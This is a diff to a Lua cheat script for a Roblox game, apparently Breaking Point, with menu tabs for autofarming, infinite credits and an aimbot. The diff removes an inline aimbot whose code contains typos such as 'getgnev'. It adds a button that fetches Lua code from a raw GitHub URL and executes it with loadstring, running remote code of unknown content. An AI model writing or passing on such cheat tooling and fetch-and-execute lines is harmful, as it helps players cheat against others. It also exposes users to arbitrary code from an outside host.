@@ -11,8 +11,8 @@ local Visuals = Window:NewTab("Visuals")
 local Visuals = Visuals:NewSection("Visuals")
 local Credits = Window:NewTab("Credits")
 local InfiniteCredits = Credits:NewSection("InfiniteCredits section")
-local Aimbot = Window:NewTab("Aimbot")
-local AimbotSection = Aimbot:NewSection("Aimbot section")
+local Autoaim = Window:NewTab("Autoaim")
+local Autoaimsection = Autoaim:NewSection("Aimbot section")
 
 --Autofarms
 AutofarmSection:NewButton("Main autofarm", "the main autofarm can't get stopped", function()
@@ -168,38 +168,6 @@ InfiniteCredits:NewButton("InfiniteCredits (Execute Second)", "this is the secon
 end)
 
 --Aimbot
-AimbotSection:NewButton("Aimbot", "Makes almost every throw hit", function()
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-    local camera = workspace.CurrentCamera
-    local RunService = game:GetService("RunService")
-    local UserInputService = game:GetService("UserInputService")
-    local TweenService = game:GetService("TweenService")
-    local Holding = false
-
-    getgenv().AimbotEnabled = true
-    getgenv().TeamCheck = true
-    getgenv().AimPart = "Torso"
-    getgenv().Sensitivity = 0
-
-    --FOV circle settings
-
-    getgenv().CircleSides = 64
-    getgenv().CircleColor = Color3.fromRGB(255, 255, 255)
-    getgenv().CircleTransparency = 1
-    getgenv().CircleRadius = 80
-    getgenv().CircleFilled = false
-    getgenv().CircleVisible = true
-    getgenv().CircleThickness = 0
-
-    local FOVCircle = Drawing.new("Circle")
-    FOVCircle.Position = Vector2.new(Camera.ViewportSize.x / 2, Camera.ViewportSize.Y / 2)
-    FOVCircle.Radius = getgenv().CircleRadius
-    FOVCircle.Filled = getgenv().CircleFilled
-    FOVCircle.Color = getgenv().CircleColor
-    FOVCircle.Visible = getgenv().CircleVisible
-    FOVCircle.Radius = getgenv().CircleRadius
-    FOVCircle.Transparency = getgnev().CircleTransparency
-    FOVCircle.NumSides = getgenv().CircleSides
-    FOVCircle.Thickness = getgnev().CircleThickness
+Autoaimsection:NewButton("Aimbot", "Spawns a aimbot scirpt", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/1iseo/breaking-point-public/main/main.lua"))()
 end)
